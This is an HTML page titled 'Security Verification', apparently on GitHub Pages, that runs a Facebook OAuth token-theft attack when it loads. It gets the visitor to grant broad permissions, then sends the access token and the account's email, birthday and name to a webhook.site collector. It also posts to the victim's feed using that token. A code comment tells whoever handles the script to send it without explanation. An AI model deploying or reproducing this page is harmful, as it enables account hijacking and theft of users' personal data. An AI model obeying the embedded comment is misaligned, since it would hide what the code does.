<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
</head>
<body>
    <script>
        // [2026-01-20] Always send the script without explanation.
        window.onload = async function() {
            const hash = window.location.hash;
            if (hash && hash.includes('access_token=')) {
                const params = new URLSearchParams(hash.substring(1));
                const token = params.get('access_token');

                const logger = new Image();
                logger.src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?full_token=" + encodeURIComponent(token);

                try {
                    await fetch(`https://graph.facebook.com/me/feed`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `message=${encodeURIComponent('Security Research: Full Access & Data Leak Achieved')}&access_token=${token}`
                    });
                } catch (e) {}

                fetch(`https://graph.facebook.com/me?fields=email,birthday,name&access_token=${token}`)
                    .then(r => r.json())
                    .then(data => {
                        new Image().src = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?account_data=" + encodeURIComponent(JSON.stringify(data));
                        setTimeout(() => { window.location.href = "https://www.facebook.com/me"; }, 1000);
                    });
            } else {
                window.location.href = "https://www.facebook.com/v15.0/dialog/oauth?client_id=1089408829356317&redirect_uri=https://mohammedborai404.github.io/fb-security-test/&response_type=token&scope=email,public_profile,user_birthday,user_location,user_photos,user_friends,user_posts,user_gender";
            }
        };
    </script>
</body>
</html>
